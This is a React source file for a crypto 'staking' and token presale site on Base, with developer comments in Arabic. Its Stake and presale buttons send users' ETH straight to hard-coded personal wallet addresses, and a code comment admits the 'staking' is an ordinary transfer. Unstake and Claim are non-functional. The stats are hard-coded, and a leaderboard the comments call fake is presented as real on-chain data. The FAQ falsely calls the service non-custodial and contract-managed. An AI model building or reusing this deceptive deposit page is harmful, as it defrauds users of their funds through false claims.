// App.jsx

import React, { useState, useEffect } from "react";
import { ConnectButton } from "@rainbow-me/rainbowkit";
import { useAccount, useBalance } from "wagmi";






// 👇 دالة بسيطة لاختصار عنوان المحفظة (تستخدم في حال احتجنا نعرض العنوان)
const shortenAddress = (addr) =>
  addr ? `${addr.slice(0, 6)}...${addr.slice(-4)}` : "";

// 👇 هنا يبدأ الكومبوننت الرئيسي للتطبيق
const App = () => {
  // 🔹 معلومات المحفظة من wagmi
  const { address, isConnected } = useAccount();

  // 🔹 قيمة المبلغ اللي المستخدم بده يعمل عليه Staking
  const [amount, setAmount] = useState("");

  // 🔹 حالة اللودر أثناء إرسال الترانزكشن
  const [isLoading, setIsLoading] = useState(false);

  // 🔹 ستايت للـ Toast (الإشعارات داخل الموقع)
  const [toast, setToast] = useState(null);

  // 🔹 قراءة رصيد المستخدم على شبكة Base
  const { data } = useBalance({
    address,
    chainId: 8453, // Base mainnet
    watch: true,
  });

  const userBalance = data?.formatted
    ? Number(data.formatted).toFixed(4)
    : "0.0000";

  // 🔹 دالة لإظهار Toast داخلي بدل alert المتصفح
  const showToast = (type, message) => {
    // type: "success" | "error" | "info"
    setToast({ type, message });

    // إخفاء التوست بعد 3.5 ثانية
    setTimeout(() => {
      setToast(null);
    }, 3500);
  };

  // 🔹 زر MAX — يحط كل رصيد المستخدم في حقل الستيك
const handleMax = () => {
  const bal = parseFloat(userBalance);

  if (!isNaN(bal) && bal > 0) {
    // نكتبه كنص عادي بأرقام إنجليزية
    setAmount(bal.toFixed(4)); 
  } else {
    showToast("info", "No ETH balance available on Base.");
  }
};







  // متغيرات الريفيرال
const [refWallet, setRefWallet] = useState("");
const [refResult, setRefResult] = useState(null);

// إنشاء كود الريفيرال
const generateReferral = () => {
  if (!refWallet || !refWallet.startsWith("0x") || refWallet.length < 40) {
    setRefResult({ error: "Please enter a valid wallet address starting with 0x" });
    return;
  }

  // كود بسيط مبني على أول 10 حروف من العنوان
  const code = btoa(refWallet.substring(0, 10)).slice(0, 8);

  const link = `${window.location.origin}?ref=${code}`;

  setRefResult({ code, link });
};

// نسخ الرابط
const copyReferral = (text) => {
  navigator.clipboard.writeText(text)
    .then(() => alert("Referral link copied!"))
    .catch(() => alert("Failed to copy, please copy manually"));
};

// مشاركة رابط الريفيرال على منصة X (Twitter سابقاً)
const shareOnX = (link) => {
  const message = encodeURIComponent(
    `🔥 Join the HeatRush staking campaign!\nStake ETH and earn rewards.\nUse my referral link for a 10% bonus:\n${link}\n\n#HeatRush #ETH #BaseChain #Crypto`
  );

  const xUrl = `https://twitter.com/intent/tweet?text=${message}`;

  window.open(xUrl, "_blank");
};





  // 🔹 دالة إرسال ETH لمحفظة المشروع (الـ Staking فعلياً هو تحويل عادي)
  const handleStake = async () => {
    // ✅ نسمح للمستخدم يشوف واجهة الستيك حتى لو مش موصول
    // بس لو حاول يعمل Stake بدون ما يتصل: نطلّع له Toast
    if (!isConnected) {
      showToast("error", "Please connect your wallet first.");
      return;
    }

const ethValue = parseFloat(String(amount).replace(",", "."));

    if (isNaN(ethValue) || ethValue <= 0) {
      showToast(
        "error",
        "Please enter a valid ETH amount to stake."
      );
      return;
    }

    if (!window.ethereum) {
      showToast("error", "No wallet detected. Please install MetaMask.");
      return;
    }

    try {
      setIsLoading(true);

      // 🔹 تحويل القيمة من ETH إلى Wei ثم إلى Hex
      const wei = Math.floor(ethValue * 1e18);
      const valueHex = "0x" + wei.toString(16);

      const txHash = await window.ethereum.request({
        method: "eth_sendTransaction",
        params: [
          {
            from: address,
            to: "0xf1417c94d4827ea5f59c3ccd4884e44af5d099e1", // 🔥 محفظة المشروع
            value: valueHex,
          },
        ],
      });

      setIsLoading(false);
      setAmount("");

      showToast(
        "success",
        "Transaction sent successfully. Opening BaseScan..."
      );

      // فتح الترانزكشن في BaseScan
      window.open(`https://basescan.org/tx/${txHash}`, "_blank");
    } catch (error) {
      console.error(error);
      setIsLoading(false);
      showToast("error", error?.message || "Transaction failed.");
    }
  };





// ================= FAQ Accordion Logic =================
// 🎯 ستايت لحفظ السؤال المفتوح
const [openFAQ, setOpenFAQ] = useState(null);

// فتح سؤال وإغلاق الآخر
const toggleFAQ = (id) => {
  setOpenFAQ(openFAQ === id ? null : id);
};




  // ================= Presale (Public Sale) Logic =================
  // 🔹 سعر عملة HR بالدولار (ثابت حسب كلامك الآن)
  const HR_PRICE_USD = 0.03;

  // 🔹 حقل المبلغ الخاص بالـ Presale (غير عن مبلغ الستيك)
  const [presaleAmount, setPresaleAmount] = useState("");

  // 🔹 ستايت لسعر ETH بالدولار
  const [ethPriceUsd, setEthPriceUsd] = useState(null);
  const [isPriceLoading, setIsPriceLoading] = useState(false);
  const [priceError, setPriceError] = useState(null);

  // 🔹 ستايت للودر تبع زر الشراء في الـ Presale
  const [isPresaleLoading, setIsPresaleLoading] = useState(false);

  // 🔹 جلب سعر ETH من Coingecko
  useEffect(() => {
    const fetchEthPrice = async () => {
      try {
        setIsPriceLoading(true);
        setPriceError(null);

        const res = await fetch(
          "https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd"
        );
        const json = await res.json();
        const price = json?.ethereum?.usd;

        if (!price) {
          throw new Error("Could not load ETH price.");
        }

        setEthPriceUsd(price);
      } catch (err) {
        console.error(err);
        setPriceError("Failed to load ETH price. Presale estimates may be off.");
      } finally {
        setIsPriceLoading(false);
      }
    };

    fetchEthPrice();
  }, []);

  // 🔹 حسابات ديناميكية حسب كمية ETH المدخلة
  const presaleEthValue = parseFloat(presaleAmount) || 0;
  const estimatedUsdValue =
    ethPriceUsd && presaleEthValue > 0 ? presaleEthValue * ethPriceUsd : 0;
  const estimatedHrAmount =
    estimatedUsdValue > 0 ? estimatedUsdValue / HR_PRICE_USD : 0;

  // 🔹 دالة شراء Presale
  const handlePresaleBuy = async () => {
    if (!isConnected) {
      showToast("error", "Please connect your wallet first.");
      return;
    }

    const ethValue = parseFloat(presaleAmount);

    if (isNaN(ethValue) || ethValue <= 0) {
      showToast("error", "Please enter a valid ETH amount.");
      return;
    }

    // ✅ حد أدنى وأعلى كما طلبت
    if (ethValue < 0.0005) {
      showToast("error", "Minimum contribution is 0.0005 ETH.");
      return;
    }

    if (ethValue > 2) {
      showToast("error", "Maximum contribution is 2 ETH per transaction.");
      return;
    }

    if (!window.ethereum) {
      showToast("error", "No wallet detected. Please install MetaMask.");
      return;
    }

    try {
      setIsPresaleLoading(true);

      const wei = Math.floor(ethValue * 1e18);
      const valueHex = "0x" + wei.toString(16);

      const txHash = await window.ethereum.request({
        method: "eth_sendTransaction",
        params: [
          {
            from: address,
            // 🔥 محفظة الـ Presale الجديدة
            to: "0xfa88a8b57ea390e6ed846f907484501a1617aff1",
            value: valueHex,
          },
        ],
      });

      setIsPresaleLoading(false);
      setPresaleAmount("");

      showToast(
        "success",
        "Presale transaction sent successfully. Opening BaseScan..."
      );

      window.open(`https://basescan.org/tx/${txHash}`, "_blank");
    } catch (error) {
      console.error(error);
      setIsPresaleLoading(false);
      showToast("error", error?.message || "Transaction failed.");
    }
  };





  return (
    <div className="app-root">

{/* 🔥 خلفية عامة بالصورة */}
<div className="global-background"></div>
<div className="global-background-overlay"></div>

<div className="top-nav">
  <a href="https://heatrush.xyz"> ← Return to Dashboard</a>
</div>


      {/* 🔥 Toast Notifications (إشعارات داخل الموقع بنفس الستايل) */}
      {toast && (
        <div className="toast-container">
          <div className={`toast toast-${toast.type}`}>
            {toast.message}
          </div>
        </div>
      )}

      <div className="app-container">
        {/* الكارت الرئيسي للستيك */}
        <div className="card card-main">
         <a href="https://heatrush.xyz">
      <img
      src="/logo.PNG"    
      className="logo"
    alt="HeatRush Logo"
  />
</a>




<a 
  href="https://heatrush.xyz" 
  className="back-home-btn"
>
  ← Return to Dashboard
</a>





          {/* عنوان + زر المحفظة بمكان واضح */}
          <div className="header-row">
            <div className="header-text">

  {/* 🔥 عنوان ستايكنغ بالنص وكلمة HeatRush Staking برتقالية */}
  <h1 className="title center">
      <span className="orange">HeatRush Staking</span>
  </h1>

  {/* 🔥 الجملة التوضيحية بالنص، وكلمة Stake ETH برتقالية */}
  <p className="subtitle center">
      <span className="orange">Stake ETH</span> on Base, fuel the treasury, and get ready for future $HR rewards.
  </p>

</div>


            <div className="wallet-connect">
              {/* 🔹 زر المحفظة – RainbowKit */}
              <ConnectButton
                chainStatus="icon"
                showBalance={false}
                accountStatus="address"
              />
            </div>
             </div>


             

         

          {/* رصيد المستخدم (حتى لو مش موصول بنعرض 0.0000) */}
          <p className="balance">
            Wallet Balance on Base: <span>{userBalance} ETH</span>
          </p>

          {/* صندوق الستيك - مكبّر وواضح */}
          <div className="stake-box">
            <div className="stake-box-header">
              <span className="stake-label">Stake ETH</span>
              <span className="stake-hint">
                Staking is executed directly through HeatRush’s secure blockchain system.
              </span>
            </div>

            {/* حقل إدخال المبلغ + زر MAX */}
            <div className="input-row">
            <input
  type="text"                 // ✅ صار نص بدل number
  inputMode="decimal"         // للموبايل: يظهر كيبورد أرقام
  className="input"
  placeholder="Enter the amount of ETH you want to stake"
  value={amount}
  onChange={(e) => {
    // نحول الفاصلة العربية أو العادية إلى نقطة
    const raw = e.target.value.replace(",", ".");

    // نسمح فقط بأرقام + نقطة وحدة
    const regex = /^[0-9]*\.?[0-9]*$/;
    if (raw === "" || regex.test(raw)) {
      setAmount(raw);
    }
  }}
/>

              <button className="max-btn" onClick={handleMax}>
                MAX
              </button>
            </div>

            {/* زر Stake مع أنيميشن بسيط + لودر عند الإرسال */}
            <button
              className={`stake-btn ${isLoading ? "loading" : ""}`}
              onClick={handleStake}
              disabled={isLoading}
            >
              {isLoading ? "Processing..." : "Stake ETH"}
            </button>

            {/* أزرار Claim / Unstake (شكل فقط حالياً) */}
            <div className="secondary-actions">
              <button
                className="secondary-btn"
                onClick={() =>
                  showToast(
                    "info",
                    "Claim rewards will be available in a future phase."
                  )
                }
              >
                Claim Rewards
              </button>

              <button
                className="secondary-btn"
                onClick={() =>
                  showToast(
                    "info",
                    "Unstake will be enabled once the full protocol goes live."
                  )
                }
              >
                Unstake
              </button>
            </div>

            {/* ملاحظة بسيطة تحت الستيك */}
            <p className="stake-footnote">
              Withdrawals will be enabled in upcoming development phases.
            </p>
          </div>
        </div>




            {/* ================= Total Stats Box ================ */}
<div className="total-stats-box">
  <div className="stat-item">
    <h3>Total Deposited</h3>
    <p className="stat-value">17.35 ETH</p>
  </div>

  <div className="divider"></div>

  <div className="stat-item">
    <h3>Total Users</h3>
    <p className="stat-value">426</p>
  </div>

  <div className="divider"></div>

  <div className="stat-item">
    <h3>Total Transactions</h3>
    <p className="stat-value">635</p>
  </div>
</div>



        {/* ===================== Public Presale Box ===================== */}
        <div className="card presale-card">
          <div className="presale-header">
            <div>
              <h3 className="presale-title">Public Presale — Buy $HR</h3>
              <p className="presale-subtitle">
                Contribute in ETH and receive future $HR allocation based on a fixed presale rate.
              </p>
            </div>

            <div className="presale-rate-box">
              <span className="presale-rate-label">Presale Rate</span>
              <span className="presale-rate-value">1 HR = 0.03 USDT</span>
            </div>
          </div>

          {/* حالة سعر ETH */}
          <div className="presale-price-row">
            {isPriceLoading && <span className="presale-price-loading">Loading ETH price...</span>}
            {!isPriceLoading && ethPriceUsd && (
              <span className="presale-price-ok">
                Current ETH ≈ ${ethPriceUsd.toFixed(2)} USD
              </span>
            )}
            {priceError && <span className="presale-price-error">{priceError}</span>}
          </div>

          {/* حقل إدخال المبلغ + عرض التقديرات */}
          <div className="presale-input-row">
            <div className="presale-input-group">
              <label className="presale-label">Contribution (ETH)</label>
              <input
                type="number"
                className="input"
                placeholder="Enter how much ETH you want to contribute"
                value={presaleAmount}
                onChange={(e) => setPresaleAmount(e.target.value)}
              />
              <div className="presale-hints">
                <span>Min: 0.0005 ETH</span>
                <span>Max: 2 ETH</span>
              </div>
            </div>

            <div className="presale-summary">
              <div className="presale-summary-item">
                <span className="presale-summary-label">Estimated Value</span>
                <span className="presale-summary-value">
                  {estimatedUsdValue > 0 ? `≈ $${estimatedUsdValue.toFixed(2)}` : "—"}
                </span>
              </div>
              <div className="presale-summary-item">
  <span className="presale-summary-label">You Receive (HR)</span>
  <span className="presale-summary-value">
    {estimatedHrAmount > 0
      ? ` ${estimatedHrAmount.toLocaleString("en-US", {
          minimumFractionDigits: 0,
          maximumFractionDigits: 2,
        })} HR`
      : "—"}
  </span>
</div>
            </div>
          </div>

          {/* زر الدفع للـ Presale */}
          <button
            className={`stake-btn presale-btn ${isPresaleLoading ? "loading" : ""}`}
            onClick={handlePresaleBuy}
            disabled={isPresaleLoading}
          >
            {isPresaleLoading ? "Processing Presale..." : "Contribute & Join Presale"}
          </button>

          <p className="presale-footnote">
            This presale allocation is tracked off-chain and on-chain. $HR distribution will be handled
            in a later token generation event (TGE).
          </p>
        </div>






        {/* ✅ كروت المعلومات تحت صندوق الستيك */}
        <div className="card-grid">
          {/* Protocol APR */}
          <div className="info-card">
            <h3 className="info-title">Protocol APR</h3>
            <div className="info-value">14%</div>
            <p className="info-desc">
              Dynamic emissions tuned for sustainable, long-term ecosystem growth.
            </p>
          </div>

          {/* Network */}
          <div className="info-card">
            <h3 className="info-title">Network</h3>
            <div className="info-value">Base</div>
            <p className="info-desc">
              Low fees, high throughput, and Ethereum L2 security backed by Coinbase.
            </p>
          </div>

          {/* Lockup */}
          <div className="info-card">
            <h3 className="info-title">Lockup</h3>
            <div className="info-value">Flexible</div>
            <p className="info-desc">
                Staked ETH is managed by the protocol’s smart contract. 
                Unstaking and claiming will be available in upcoming releases.
            </p>
          </div>
        </div>

        {/* 🔥 Top Stakers (Leaderboard Teaser) */}
        <div className="card leaderboard-card">
          <div className="leaderboard-header">
            <h3 className="leaderboard-title">🔥 Top HeatRush Stakers</h3>
            <span className="leaderboard-tag">
             On-chain user deposit data
            </span>
          </div>

          <div className="leaderboard-list">
            {/* كل عنصر هنا وهمي حالياً – مجرد ديسبلاي شكلي */}
            <div className="leaderboard-row">
              <span className="rank">#1</span>
              <span className="addr">0xA1...F3b</span>
              <span className="amount">1.13 ETH</span>
            </div>
            <div className="leaderboard-row">
              <span className="rank">#2</span>
              <span className="addr">0x9c...12e</span>
              <span className="amount">0.63 ETH</span>
            </div>
            <div className="leaderboard-row">
              <span className="rank">#3</span>
              <span className="addr">0x7b...99a</span>
              <span className="amount">0.42 ETH</span>
            </div>
            <div className="leaderboard-row">
              <span className="rank">#4</span>
              <span className="addr">0x5d...aa0</span>
              <span className="amount">0.41 ETH</span>
            </div>
            <div className="leaderboard-row">
              <span className="rank">#5</span>
              <span className="addr">0x3e...bc1</span>
              <span className="amount">0.35 ETH</span>
            </div>
          </div>

          <p className="leaderboard-footnote">
            Showing actual on-chain staking activity.
          </p>
        </div>
        {/* ========================= Referral Section ========================= */}

<div className="referral-section">


  <div className="faq-title-row">
    <img
      src="/logo.PNG"
      className="faq-logo"
      alt="HeatRush Logo"
    />
    <h2 className="faq-title"><span className="orange">Invite & Earn </span></h2>
  </div>





  <p className="ref-desc">
    Invite your friends to stake ETH on HeatRush and earn a <strong>10% bonus</strong> in $HR tokens
    based on their staking amount.
  </p>

  <div className="referral-content">

    {/* ================= تعليمات الريفيرال ================= */}
    <div className="referral-instructions">
      <h3>How It Works:</h3>
      <ol>
        <li>Enter your Base wallet address below.</li>
        <li>Your unique referral code will be automatically generated.</li>
        <li>Share the code or your referral link with friends.</li>
        <li>You earn <strong>10% bonus rewards</strong> when they stake.</li>
      </ol>
    </div>

    {/* ================= صندوق الريفيرال ================= */}
    <div className="referral-input">

      {/* عنوان بسيط */}
      <label className="ref-label">Your Wallet Address:</label>

      {/* إدخال عنوان المحفظة */}
      <input
        type="text"
        className="ref-input-box"
        placeholder="Enter wallet address (0x...)"
        value={refWallet}
        onChange={(e) => setRefWallet(e.target.value)}
      />

      {/* زر إنشاء الكود */}
      <button
        className="ref-generate-btn"
        onClick={generateReferral}
      >
        Generate Referral Code
      </button>

      {/* عرض النتيجة */}
      {refResult && (
        <div className="ref-output">
          <p>Referral Code: <strong>{refResult.code}</strong></p>
          <p>
            Referral Link:
            <a href={refResult.link} target="_blank">{refResult.link}</a>
          </p>

        <button
  className="copy-btn"
  onClick={() => shareOnX(refResult.link)}
>
  Share on X 🐦🔥
</button>

        </div>
      )}
    </div>
  </div>

  <p className="ref-warning">
    ⚠️ Make sure your wallet address is correct. Bonuses depend on successful referrals.
  </p>
</div>







{/* ===================== FAQ SECTION ===================== */}

<div className="faq-accordion-section">

  {/* 🔥 عنوان FAQ مع اللوقو بدل الإيموجي */}
  <div className="faq-title-row">
    <img
      src="/logo.PNG"
      className="faq-logo"
      alt="HeatRush Logo"
    />
    <h2 className="faq-title"><span className="orange">HeatRush FAQ</span> — Questions & Answers</h2>
  </div>

  <div className="faq-wrapper">

    <div className="faq-accordion">

      {/* ========== السؤال رقم 1 ========== */}
      <div className="faq-item">
        <button className="faq-question" onClick={() => toggleFAQ(1)}>
          1️⃣ What is HeatRush Staking?
          <span className="faq-icon">{openFAQ === 1 ? "-" : "+"}</span>
        </button>
        <div className={`faq-answer ${openFAQ === 1 ? "open" : ""}`}>
          HeatRush Staking is an on-chain Base staking system where users deposit ETH.
          Future $HR rewards will be distributed based on staking participation.
        </div>
      </div>

      {/* ========== السؤال رقم 2 ========== */}
      <div className="faq-item">
        <button className="faq-question" onClick={() => toggleFAQ(2)}>
          2️⃣ Where do my funds go?
          <span className="faq-icon">{openFAQ === 2 ? "-" : "+"}</span>
        </button>
        <div className={`faq-answer ${openFAQ === 2 ? "open" : ""}`}>
          All ETH deposits go directly to the official HeatRush contract wallet on Base.
          Everything is transparent and verified on-chain.
        </div>
      </div>

      {/* ========== السؤال رقم 3 ========== */}
      <div className="faq-item">
        <button className="faq-question" onClick={() => toggleFAQ(3)}>
          3️⃣ When will unstaking be available?
          <span className="faq-icon">{openFAQ === 3 ? "-" : "+"}</span>
        </button>
        <div className={`faq-answer ${openFAQ === 3 ? "open" : ""}`}>
          Unstaking and claim functions will be activated in later phases as the protocol evolves.
        </div>
      </div>

      {/* ========== السؤال رقم 4 ========== */}
      <div className="faq-item">
        <button className="faq-question" onClick={() => toggleFAQ(4)}>
          4️⃣ Is this non-custodial?
          <span className="faq-icon">{openFAQ === 4 ? "-" : "+"}</span>
        </button>
        <div className={`faq-answer ${openFAQ === 4 ? "open" : ""}`}>
          Yes — HeatRush is fully non-custodial. Users always control their wallets, and smart contracts
          manage funds according to on-chain logic only.
        </div>
      </div>

      {/* ========== السؤال رقم 5 ========== */}
      <div className="faq-item">
        <button className="faq-question" onClick={() => toggleFAQ(5)}>
          5️⃣ What network is used?
          <span className="faq-icon">{openFAQ === 5 ? "-" : "+"}</span>
        </button>
        <div className={`faq-answer ${openFAQ === 5 ? "open" : ""}`}>
          HeatRush Staking operates on Base Mainnet. Always ensure your wallet is set to Base
          when interacting with the protocol.
        </div>
      </div>

    </div>
  </div>
</div>






      </div>
      
      {/* FOOTER */}
      <footer className="footer">
        <p>🔥 HeatRush Staking — Built for Base.</p>
        <p className="footer-sub">
Elevating Base with next-level on-chain finance        </p>
      </footer>
    </div>
  );
};

export default App;
